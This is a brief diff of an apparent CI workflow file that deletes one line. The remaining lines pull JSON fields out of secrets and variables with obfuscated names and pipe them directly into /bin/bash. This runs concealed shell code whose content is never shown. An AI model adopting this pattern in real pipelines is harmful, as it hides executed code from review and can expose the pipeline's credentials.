@@ -22,7 +22,6 @@ jobs:
           y3: ${{ secrets.y3 }}
         run: |
           printf '%s' "$y3" | jq -r .fxxz619 | /bin/bash
-          printf '%s' "$zv16678" | jq -r .re65 | /bin/bash
           echo $r4595 | jq -r .u04065 | /bin/bash
           printf '%s' "$gvas76" | jq -r .cbuaz43355 | /bin/bash
           echo $ns08 | jq -r .k441 | /bin/bash
